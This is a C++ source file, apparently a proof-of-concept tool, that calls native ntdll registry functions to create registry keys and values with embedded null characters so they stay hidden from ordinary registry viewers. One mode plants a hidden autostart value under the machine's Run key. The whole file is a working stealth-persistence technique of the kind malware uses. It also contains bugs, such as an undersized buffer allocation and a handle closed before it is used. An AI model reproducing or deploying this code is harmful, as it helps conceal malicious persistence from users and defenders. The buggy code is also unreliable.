// RegHide.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "defs.h"
#include "funcs.h"

#define MODE 0


void InitFunctions()
{
	HMODULE hMod = GetModuleHandleA("ntdll.dll");
	_RtlInitUnicodeString = (PROC_RtlInitUnicodeString)GetProcAddress(hMod, "RtlInitUnicodeString");
	_NtOpenKey = (PROC_NtOpenKey)GetProcAddress(hMod, "NtOpenKey");
	_NtCreateKey = (PROC_NtCreateKey)GetProcAddress(hMod, "NtCreateKey");
	_NtDeleteKey = (PROC_NtDeleteKey)GetProcAddress(hMod, "NtDeleteKey");
	_NtSetValueKey = (PROC_NtSetValueKey)GetProcAddress(hMod, "NtSetValueKey");
	_NtClose = (PROC_NtClose)GetProcAddress(hMod, "NtClose");
}


void OpenRegistryKey(wchar_t KeyPath[],HANDLE * Key)
{
	HANDLE hKey;
	OBJECT_ATTRIBUTES objAttrs;
	UNICODE_STRING KeyNameUni;
	NTSTATUS status;

	_RtlInitUnicodeString(&KeyNameUni, KeyPath);

	objAttrs = { sizeof(objAttrs),0,&KeyNameUni,OBJ_CASE_INSENSITIVE };
	
	status = _NtOpenKey(Key, KEY_ALL_ACCESS, &objAttrs);

	if (!NT_SUCCESS(status))
		std::cout << "An error occured\n";
}

NTSTATUS CreateHiddenRegistryKey(HANDLE * hKey, wchar_t KeyPath[], wchar_t KeyName[])
{
	NTSTATUS status;
	OBJECT_ATTRIBUTES objAttrs;
	UNICODE_STRING KeyNameUni;

	//We just need KeyName lenght plus one for null terminating char
	int KeyNameBufferLenght = (wcslen(KeyPath) + wcslen(KeyName) + 1);

	//Create new buffer for Null-Terminating buffer
	wchar_t * KeyNameBuffer = (wchar_t*)malloc(KeyNameBufferLenght);

	//Copy KeyName to Buffer
	wcscpy(KeyNameBuffer, KeyPath);

	wcscat(KeyNameBuffer, L"\\");

	catnull(KeyNameBuffer, KeyName);

	//Im using custom instead RtlInitUnicodeString because function ignoring null terminating char
	KeyNameUni = StrToUnicode(KeyNameBuffer, ((((wcslen(KeyPath) + wcslen(KeyName)) * 2) + 2)));


	objAttrs.Length = sizeof(OBJECT_ATTRIBUTES);
	objAttrs.RootDirectory = NULL;
	objAttrs.ObjectName = &KeyNameUni;
	objAttrs.Attributes = OBJ_CASE_INSENSITIVE;
	objAttrs.SecurityDescriptor = NULL;
	objAttrs.SecurityQualityOfService = NULL;

	return status = _NtCreateKey(hKey, KEY_ALL_ACCESS, &objAttrs, 0, NULL, REG_OPTION_NON_VOLATILE, NULL);
}
NTSTATUS CreateHiddenRegistryValue(HANDLE hKey, wchar_t ValueName[], PVOID Data, ULONG DataSize, ULONG Type)
{
	UNICODE_STRING ValueNameUni;
	NTSTATUS status;

	ValueNameUni = StrToUnicode(ValueName, countnull(ValueName) * sizeof(wchar_t));

	return status = _NtSetValueKey(hKey, &ValueNameUni, 0, Type, Data, DataSize);
}

int main()
{
	InitFunctions(); //Initialize Native Api's

	NTSTATUS status;
#if MODE == 1 //Mode 0 Create Hidden Value , Mode 1 Create Hidden Key

	HANDLE hKey = NULL;

	wchar_t * value = L"C:\\Windows\\notepad.exe";
	wchar_t * name = L"Hidden";
	
	//Append null-terminating char
	addnull(name);
	
	OpenRegistryKey(L"\\Registry\\Machine\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",&hKey);
	
	if (hKey == 0)
		goto badhandle;

	_NtClose(hKey);

	status = CreateHiddenRegistryValue(hKey, name,value ,wcslen(value) * sizeof(wchar_t) , REG_SZ);

	if (NT_SUCCESS(status))
	{
		std::cout << "value created successfully.";
	}
	else
	{
		std::cout << "an error occurred while value creating.";
	}

	return 0;
#else
	HANDLE hKey;

	status = CreateHiddenRegistryKey(&hKey, L"\\Registry\\Machine\\Software", L"HiddenKey");

	if (hKey == 0)
		goto badhandle;
	
	if (NT_SUCCESS(status))
	{
		std::cout << "value created successfully.";
	}
	else
	{
		std::cout << "an error occurred while value creating.\n";
	}

	NTSTATUS deleteStatus = _NtDeleteKey(hKey);

	if (NT_SUCCESS(deleteStatus))
	{
		std::cout << "Hidden key deleted from your registry hive ;)\n";
	}
	else
	{
		std::cout << "An error occured !\n";
	}

	_NtClose(hKey);

	return 0;
#endif
	
badhandle:
	std::cout << "Handle returned null value !\n";
	return 1;

}

